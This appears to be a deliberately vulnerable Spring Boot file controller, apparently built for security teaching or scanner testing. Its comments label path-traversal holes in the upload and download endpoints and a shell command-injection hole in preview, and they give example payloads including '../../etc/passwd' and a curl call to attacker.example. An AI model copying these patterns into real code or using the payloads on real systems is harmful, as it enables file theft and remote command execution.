package com.example.todoapp.controller;

import org.springframework.beans.factory.annotation.Value;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.multipart.MultipartFile;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.file.Files;

@RestController
@RequestMapping("/api/files")
public class FileController {

    @Value("${app.upload-dir}")
    private String uploadDir;

    /**
     * VULNERABLE (CWE-22, Path Traversal): the client-supplied filename is used to build
     * the destination path with no sanitization, so a name such as
     * "../../etc/cron.d/evil" (or an absolute path) lets the caller write outside the
     * intended upload directory.
     */
    @PostMapping("/upload")
    public ResponseEntity<String> upload(@RequestParam String filename, @RequestParam MultipartFile file) throws IOException {
        File dest = new File(uploadDir, filename);
        try (FileOutputStream out = new FileOutputStream(dest)) {
            out.write(file.getBytes());
        }
        return ResponseEntity.ok("stored at " + dest.getPath());
    }

    /**
     * VULNERABLE (CWE-22, Path Traversal): same unsanitized-filename issue as upload(),
     * but on the read path, so a name such as "../../../../etc/passwd" discloses files
     * outside the upload directory.
     */
    @GetMapping("/download")
    public ResponseEntity<byte[]> download(@RequestParam String filename) throws IOException {
        File file = new File(uploadDir, filename);
        byte[] content = Files.readAllBytes(file.toPath());
        return ResponseEntity.ok()
                .contentType(MediaType.APPLICATION_OCTET_STREAM)
                .body(content);
    }

    /**
     * VULNERABLE (CWE-78, OS Command Injection): the filename is passed straight into a
     * shell command, so a value such as "foo.txt; curl attacker.example/$(whoami)" or
     * "$(reboot)" is executed on the host by the shell.
     */
    @GetMapping("/preview")
    public ResponseEntity<String> preview(@RequestParam String filename) throws IOException, InterruptedException {
        Process process = Runtime.getRuntime().exec(new String[]{"sh", "-c", "file " + uploadDir + "/" + filename});
        process.waitFor();
        byte[] output = process.getInputStream().readAllBytes();
        return ResponseEntity.ok(new String(output));
    }
}
